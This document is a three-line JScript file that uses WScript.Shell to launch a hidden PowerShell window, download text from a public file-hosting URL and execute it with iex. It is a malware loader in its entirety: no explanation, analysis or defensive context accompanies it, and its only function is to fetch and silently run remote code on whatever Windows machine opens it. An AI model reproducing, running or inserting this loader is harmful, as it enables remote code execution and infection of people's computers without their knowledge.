var shell = new ActiveXObject("WScript.Shell");
var command = "powershell -WindowStyle Hidden -Command \"iex (iwr -Uri 'https://files.catbox.moe/l659q5.txt' -UseBasicParsing)\"";
shell.Run(command, 0, false);
